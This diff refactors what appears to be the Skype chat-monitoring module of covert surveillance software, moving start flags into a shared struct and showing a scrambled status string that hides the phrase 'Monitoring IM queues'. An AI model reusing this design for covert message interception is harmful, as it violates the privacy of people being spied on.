@@ -221,7 +221,7 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 	char req_buf[512];
 
 	// Se il monitor e' stoppato o i parametri non vanno bene, non esegue la funzione di dispatch
-	if (!bPM_IMStarted || !msg || !im_skype_message_list)
+	if (!shared.bPM_IMStarted || !msg || !im_skype_message_list)
 		return 0;
 
 	if (dwFlags == FLAGS_SKAPI_INI) {
@@ -230,7 +230,7 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 		return 1;
 	}
 	if (dwFlags == FLAGS_SKAPI_WND) {
-		ScrambleString ss("_ OEPUvEtUPC yO Hdldl1.............QM\r\n", is_demo_version); // "- Monitoring IM queues.............OK\r\n"
+		ScrambleString ss("_ OEPUvEtUPC yO Hdldl1.............QM\r\n", shared.is_demo_version); // "- Monitoring IM queues.............OK\r\n"
 		REPORT_STATUS_LOG(ss.get_str());
 		skype_api_wnd = *((HWND *)msg);
 		return 1;
@@ -388,10 +388,10 @@ DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 
 	// Se l'agent e' gia' nella condizione desiderata
 	// non fa nulla.
-	if (bPM_IMStarted == bStartFlag)
+	if (shared.bPM_IMStarted == bStartFlag)
 		return 0;
 
-	bPM_IMStarted = bStartFlag;
+	shared.bPM_IMStarted = bStartFlag;
 
 	if (bStartFlag) {
 		LOG_InitAgentLog(PM_IMAGENT);
@@ -433,6 +433,6 @@ DWORD __stdcall PM_IMInit(JSONObject elem)
 
 void PM_IMRegister()
 {
-	bPM_IMStarted = FALSE;
+	shared.bPM_IMStarted = FALSE;
 	AM_MonitorRegister(L"chat", PM_IMAGENT, (BYTE *)PM_IMDispatch, (BYTE *)PM_IMStartStop, (BYTE *)PM_IMInit, NULL);
 }
